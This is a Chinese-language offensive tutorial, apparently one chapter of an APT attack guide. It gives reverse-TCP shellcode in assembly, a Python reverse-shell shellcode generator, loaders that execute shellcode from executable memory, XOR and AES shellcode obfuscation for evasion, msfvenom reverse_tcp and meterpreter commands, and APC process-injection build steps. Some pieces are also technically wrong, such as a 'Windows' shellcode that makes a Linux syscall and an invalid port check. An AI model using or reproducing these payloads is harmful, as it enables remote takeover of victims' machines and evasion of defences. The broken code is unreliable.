## RAT介绍

## Shellcode

### Linux Shellcode

1.本地Shellcode

x86_64.asm
```asm
section .text
global _start

_start:
    xor rax, rax
    push rax
    mov rbx, 0x68732f6e69622f2f ; //bin/sh
    push rbx
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov al, 59
    syscall
```

```Bash
nasm -f elf64 x86_64.asm -o x86_64.o
ld x86_64.o -o x86_64

objdump -d x86_64 | grep '[0-9a-f]:' | grep -v 'file' | cut -f2 -d: | cut -f1-6 -d' ' | tr -s ' ' | tr '\t' ' ' | sed 's/ $//' | sed 's/ /\\x/g' | paste -d '' -s
```

x86_64.c
```c
char code[] = "Shellcode";

int main(int argc, char **argv) {
  int (*func)();             //函数指针
  func = (int (*)()) code;   //指向Shellcode
  (int)(*func)();            //执行code[]函数
  return 1;
}
```

```Bash
gcc -z execstack -o x86_64_c x86_64.c
```

2.TCP Shellcode

tcp_shellcode.asm
```asm
section .text
global _start

_start:
    ; 创建socket
    xor rax, rax
    mov al, 0x29          ; syscall: socket
    xor rdi, rdi          ; domain: AF_INET (2)
    mov dil, 0x2
    xor rsi, rsi          ; type: SOCK_STREAM (1)
    mov sil, 0x1
    xor rdx, rdx          ; protocol: IPPROTO_IP (0)
    syscall

    ; 保存socket文件描述符
    xchg rdi, rax

    ; 连接到服务器
    push rdx
    mov rbx, 0x0100007f   ; IP: 127.0.0.1 (localhost)
    push rbx
    mov rbx, 0x5c110002   ; Port: 4444 (0x5c11), AF_INET (2)
    push rbx
    mov rsi, rsp
    mov al, 0x2a          ; syscall: connect
    mov dl, 0x10          ; sockaddr length
    syscall

    ; 重定向stdin, stdout, stderr到socket
    xor rsi, rsi
    mov al, 0x21          ; syscall: dup2
    syscall
    inc rsi
    mov al, 0x21
    syscall
    inc rsi
    mov al, 0x21
    syscall

    ; 执行/bin/sh
    xor rax, rax
    push rax
    mov rbx, 0x68732f6e69622f2f
    push rbx
    mov rdi, rsp
    push rax
    push rdi
    mov rsi, rsp
    xor rdx, rdx
    mov al, 0x3b          ; syscall: execve
    syscall
```

```Bash
nasm -f elf64 tcp_shellcode.asm -o tcp_shellcode.o
ld tcp_shellcode.o -o tcp_shellcode
objdump -d tcp_shellcode | grep '[0-9a-f]:' | grep -v 'file' | cut -f2 -d: | cut -f1-6 -d' ' | tr -s ' ' | tr '\t' ' ' | sed 's/ $//' | sed 's/ /\\x/g' | paste -d '' -s
```

tcp_shellcode.c
```c
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>

unsigned char code[] = \
"Shellcode";

int main(int argc, char **argv) {
    // 设置Shellcode所在内存区域的权限
    if (mprotect((void*)((unsigned long)code & ~0xFFF), 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC) == -1) {
        perror("mprotect");
        return -1;
    }

    int (*func)();             // function pointer
    func = (int (*)()) code;   // func points to our shellcode
    (int)(*func)();            // execute a function code[]
    return 1;
}
```

python脚本生成
```python
import socket
import argparse
import sys

BLUE = '\033[94m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
RED = '\033[91m'
ENDC = '\033[0m'

def my_super_shellcode(host, port):
    print (BLUE + "let's go to create your super shellcode..." + ENDC)
    if int(port) < 1 and int(port) > 65535:
        print (RED + "port number must be in 1-65535" + ENDC)
        sys.exit()
    if int(port) >= 1 and int(port) < 1024:
        print (YELLOW + "you must be a root" + ENDC)
    if len(host.split(".")) != 4:
        print (RED + "invalid host address :(" + ENDC)
        sys.exit()

    h = socket.inet_aton(host).hex()
    hl = [h[i:i+2] for i in range(0, len(h), 2)]
    if "00" in hl:
        print (YELLOW + "host address will cause null bytes to be in shellcode :(" + ENDC)
    h1, h2, h3, h4 = hl

    shellcode_host = "\\x" + h1 + "\\x" + h2 + "\\x" + h3 + "\\x" + h4
    print (YELLOW + "hex host address: x" + h1 + "x" + h2 + "x" + h3 + "x" + h4 + ENDC)

    p = socket.inet_aton(port).hex()[4:]
    pl = [p[i:i+2] for i in range(0, len(p), 2)]
    if "00" in pl:
        print (YELLOW + "port will cause null bytes to be in shellcode :(" + ENDC)
    p1, p2 = pl

    shellcode_port = "\\x" + p1 + "\\x" + p2
    print (YELLOW + "hex port: x" + p1 + "x" + p2 + ENDC)

    shellcode = "\\x6a\\x66\\x58\\x6a\\x01\\x5b\\x31"
    shellcode += "\\xd2\\x52\\x53\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x92\\xb0\\x66\\x68"
    shellcode += shellcode_host
    shellcode += "\\x66\\x68"
    shellcode += shellcode_port
    shellcode += "\\x43\\x66\\x53\\x89\\xe1\\x6a\\x10"
    shellcode += "\\x51\\x52\\x89\\xe1\\x43\\xcd"
    shellcode += "\\x80\\x6a\\x02\\x59\\x87\\xda\\xb0"
    shellcode += "\\x3f\\xcd\\x80\\x49\\x79\\xf9"
    shellcode += "\\xb0\\x0b\\x41\\x89\\xca\\x52\\x68"
    shellcode += "\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xcd\\x80"

    print (GREEN + "your super shellcode is:" + ENDC)
    print (GREEN + shellcode + ENDC)

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-l','--lhost',
                         required = True, help = "local IP",
                         default = "127.1.1.1", type = str)
    parser.add_argument('-p','--lport',
                         required = True, help = "local port",
                         default = "4444", type = str)
    args = vars(parser.parse_args())
    host, port = args['lhost'], args['lport']
    my_super_shellcode(host, port)
```

### Windows Shellcode

Shellcode.asm
```asm
section .text
global _start

_start:
    ; 清除RAX寄存器
    xor rax, rax

    ; 将字符串"calc.exe"压入堆栈
    push rax
    mov rbx, 0x6578652e636c6163
    push rbx
    mov rdi, rsp

    ; 设置寄存器
    xor rsi, rsi          ; RSI为空
    xor rdx, rdx          ; RDX为空

    ; 调用execve
    mov al, 0x3b          ; 系统调用号：execve
    syscall
```

```Bash
nasm -f win64 shellcode.asm -o shellcode.o
ld shellcode.o -o shellcode.exe
objdump -d shellcode.exe | grep '[0-9a-f]:' | grep -v 'file' | cut -f2 -d: | cut -f1-6 -d' ' | tr -s ' ' | tr '\t' ' ' | sed 's/ $//' | sed 's/ /\\x/g' | paste -d '' -s
```

Shellcode.c
```c
#include <stdio.h>
#include <string.h>
#include <windows.h>

unsigned char code[] = \
"机器码";

int main(int argc, char **argv) {
    void (*func)();
    func = (void (*)()) code;
    func();
    return 0;
}
```

```Bash
x86_64-w64-mingw32-gcc -o cmd.exe shellcode.c -mconsole -lkernel32
```

### 多态Shellcode

```asm
section .text
global _start

_start:
    ; 解码器Stub
    xor rcx, rcx
    mov cl, 0x10          ; Shellcode长度
    xor rbx, rbx
    mov bl, 0xaa          ; XOR密钥
decode:
    xor byte [rsi + rcx - 1], bl
    loop decode

    ; 垃圾指令
    nop
    nop

    ; 实际Shellcode（示例：执行calc.exe）
    db 0x48, 0x31, 0xc0, 0x50, 0x48, 0xb8, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65
    db 0x50, 0x48, 0x89, 0xe7, 0x48, 0x31, 0xf6, 0x48, 0x31, 0xd2, 0xb0, 0x3b, 0x0f, 0x05
```

### 加密Shellcode

```asm
from Crypto.Cipher import AES
import os

# 原始Shellcode
shellcode = b"\x48\x31\xc0\x50\x48\xb8\x63\x61\x6c\x63\x2e\x65\x78\x65\x50\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\xb0\x3b\x0f\x05"

# 生成随机AES密钥
key = os.urandom(16)

# 使用AES加密Shellcode
cipher = AES.new(key, AES.MODE_ECB)
encrypted_shellcode = cipher.encrypt(shellcode.ljust(32, b'\x00'))  # 填充到16字节的倍数

print("加密后的Shellcode:", encrypted_shellcode.hex())
print("AES密钥:", key.hex())
```

加密器Stub示例
```asm
section .text
global _start

_start:
    ; AES解密器Stub
    ; 这里假设AES密钥和加密后的Shellcode已经嵌入到代码中
    ; 解密后的Shellcode将被存储在某个内存位置并执行

    ; 示例：执行解密后的Shellcode
    ; 具体的解密过程和调用方式根据实际情况调整
```

shell.cpp
```c
#include <Windows.h>

int main()
{
	const char shellcode[] = "SHELL CODE";
	PVOID shellcode_exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	RtlCopyMemory(shellcode_exec, shellcode, sizeof shellcode);
	DWORD threadID;
	for (int i = 0; i < sizeof shellcode; i++)
	{
		((char*)shellcode_exec)[i] = (((char*)shellcode_exec)[i]) - 13;
	}
	HANDLE hThread = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)shellcode_exec, NULL, 0, &threadID);
	WaitForSingleObject(hThread, INFINITE);
}
```

### Shellcode生成

Metasploit
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=攻击者主机IP地址 LPORT=4444 -f c
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.4 LPORT=4444 -f c -a x86 -e x86/shikata_ga_nai -b '\x00\x0a\x0d\x25\x26\x2b\x3d'
```



Pwntools
```Bash
pip install pwntools
```

Pwntools.py
```python
from pwn import *

# 设置目标IP和端口ip = "192.168.0.189"
port = 4444

# 生成反向shell的Shellcode
context(arch='amd64', os='linux')
shellcode = shellcraft.amd64.linux.connect(ip, port)
shellcode += shellcraft.amd64.linux.dupsh()

# 将Shellcode转换为机器码shellcode = asm(shellcode)

print("Generated Shellcode:")
print(shellcode)
print("Shellcode Length:", len(shellcode))
```

嵌入Shellcode
```c
#include <Windows.h>

int main()
{
	const char shellcode[] = "Metasploit生成的Shellcode";
	PVOID shellcode_exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	RtlCopyMemory(shellcode_exec, shellcode, sizeof shellcode);
	DWORD threadID;
	HANDLE hThread = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)shellcode_exec, NULL, 0, &threadID);
	WaitForSingleObject(hThread, INFINITE);
}
```

Cobalt Strike
```Bash
在Cobalt Strike中，选择“Attacks” -> “Packages” -> “Payload Generator”，然后选择目标平台和Payload类型，生成Shellcode
```

## APC注入

### Early Bird APC队列代码注入

[calc.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/APC/calc.cpp)

编译
```Bash
x86_64-w64-mingw32-gcc calc.cpp -o evil_calc.exe -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

### NtTestAlert函数

[nttest.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/APC/nttest.cpp)

编译
```Bash
x86_64-w64-mingw32-gcc calc.cpp -o evil_calc.exe -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

### 远程线程中的APC注入

[rev.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/APC/rev.cpp)

编译
```Bash
x86_64-w64-mingw32-g++ -O2 rev.cpp -o rev.exe -mconsole -I /usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive >/dev/null 2>&1
```

目标主机
```powershell
.\rev.exe notepad.exe
```

### Metasploit

Shellcode
```Bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=攻击者主机IP地址 LPORT=4444 -f c
```

[msf.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/APC/msf.cpp)

编译
```Bash
x86_64-w64-mingw32-g++ -O2 msf.cpp -o msf.exe -mconsole -I /usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```
